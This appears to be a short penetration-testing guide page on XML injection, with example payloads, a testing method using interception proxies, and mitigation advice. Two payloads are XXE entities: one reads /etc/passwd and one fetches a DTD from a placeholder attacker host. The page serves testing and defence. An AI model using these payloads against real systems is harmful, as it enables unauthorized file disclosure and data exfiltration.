---
description: >-
  XML Injection occurs when an attacker inserts malicious XML content into an
  application that processes XML data
---

# XML Injection

## What is XML Injection?

XML Injection occurs when an attacker inserts malicious XML content into an application that processes XML data. This can exploit vulnerabilities in how the application parses or processes the XML input. XML Injection can lead to unauthorized data access, data manipulation, or denial of service attacks.

## Example Tests for XML Injection

When performing a penetration test, you can use various payloads to test for XML injection vulnerabilities. Below are some example commands and payloads that can be used to test if an application is vulnerable to XML injection.

### **Example Payloads for XML Injection**

1.  **Basic XML Injection**

    ```xml
    <user><name>John</name><age>30</age></user>
    ```
2.  **Entity Injection**

    ```xml
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <user><name>&xxe;</name></user>
    ```
3.  **External Entity Injection**

    ```xml
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://malicious-site.com/evil.dtd">]>
    <user><name>&xxe;</name></user>
    ```
4.  **Comment Injection**

    ```xml
    <user><name><!-- --></name></user>
    ```
5.  **Attribute Injection**

    ```xml
    <user name="John" age="30" role="admin"></user>
    ```

## Testing Methodology

1. **Injecting Payloads**:
   * Identify fields in the application where you can input data that will be processed as XML.
   * Input the example payloads into these fields.
2. **Data Interception and Analysis**:
   * Intercept the XML data being sent to the server using tools like Burp Suite or OWASP ZAP.
   * Modify the intercepted data with the payloads to test for injection vulnerabilities.
3. **Observation and Mitigation**:
   * Observe the application's response to the injected XML data to detect any unauthorized actions or errors.
   * Recommend proper input validation, output encoding, and the use of secure XML parsers to prevent such injections.

